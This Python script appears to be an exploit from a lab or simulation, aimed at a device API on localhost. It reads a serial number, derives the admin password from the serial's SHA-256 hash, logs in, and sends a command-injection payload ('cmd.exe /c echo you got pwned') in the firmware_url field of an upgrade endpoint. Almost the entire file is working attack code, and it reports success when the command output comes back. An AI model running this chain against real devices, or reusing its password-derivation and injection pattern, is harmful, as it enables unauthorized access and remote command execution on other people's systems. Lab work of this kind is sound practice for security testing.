import requests
import json
import hashlib
from utils.logger import log_message

TARGET = "http://localhost:5000"

# Function to simulate the Living off the Land (LoTL) attack
def run_lotl_attack():
    try:
        # Step 1: Get serial and password
        info = requests.get(f"{TARGET}/info").json()
        serial = info["serial_number"]
        log_message(f"Serial Number: {serial}", level="INFO")

        password = hashlib.sha256(serial.encode()).hexdigest()[:8]
        log_message(f"Derived Password: {password}", level="INFO")

        # Step 2: Login
        login = requests.post(f"{TARGET}/api/login", json={
            "username": "admin",
            "password": password
        })

        if login.status_code != 200:
            log_message("Login failed", level="ERROR")
            return

        token = login.json()["token"]
        headers = {"Authorization": token, "Content-Type": "application/json"}
        log_message("Got auth token", level="INFO")

        # Step 3: LoTL Attack
        payload = {
            "firmware_url": "cmd.exe /c echo you got pwned"
        }

        response = requests.post(f"{TARGET}/installer/upgrade_start", headers=headers, data=json.dumps(payload))

        if response.status_code == 200:
            log_message("LoTL attack successful!", level="INFO")
            if "output" in response.json():
                log_message(f"Command output: {response.json()['output']}", level="INFO")
            else:
                log_message("No output returned from command.", level="INFO")
        else:
            error_msg = response.json().get("error", "No error message")
            log_message(f"Attack failed. Status Code: {response.status_code}, Error: {error_msg}", level="ERROR")

    except Exception as e:
        log_message(f"Unexpected error during LoTL attack: {e}", level="ERROR")